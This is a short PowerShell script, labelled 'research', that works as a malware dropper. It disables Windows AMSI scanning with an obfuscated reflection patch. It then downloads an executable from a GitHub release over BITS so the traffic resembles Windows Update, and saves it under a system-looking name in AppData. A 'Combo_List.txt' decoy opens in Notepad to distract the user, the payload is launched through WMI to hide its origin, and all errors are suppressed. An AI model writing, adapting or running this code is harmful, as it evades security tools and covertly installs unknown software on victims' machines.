# --- [RESEARCH STAGE: SILENT INITIALIZATION] ---

function Bypass-AMSI {
    # Using obfuscated string concatenation to hide 'AmsiUtils' from static scanners
    $a = 'System.Management.Automation.A' + 'msi' + 'Utils'
    $b = 'am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'
    $ref = [Ref].Assembly.GetType($a)
    $field = $ref.GetField($b, 'NonPublic,Static')
    $field.SetValue($null, $true)
}

# Execute the bypass before any other logic
try { Bypass-AMSI } catch { }

# --- [RESEARCH STAGE: PERSISTENCE & DEPLOYMENT] ---

# Use BITS (Background Intelligent Transfer Service) instead of WebClient. 
# BITS is a trusted system service, making the traffic look like a Windows Update.
$url = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
$workDir = "$env:LOCALAPPDATA\Microsoft\Vault"
$exePath = "$workDir\WinHostSvc.exe"

if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }

try {
    # Stealth download
    Start-BitsTransfer -Source $url -Destination $exePath -Priority High
    
    # Decoy: Open the Combo_List to distract the user
    $decoy = Join-Path $PSScriptRoot "Combo_List.txt"
    if (Test-Path $decoy) { Start-Process notepad.exe $decoy }

    # Execution via WMI (Detaches the process from PowerShell to hide the parent-child link)
    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $exePath }
} catch {
    # Fail silently to avoid popups
}
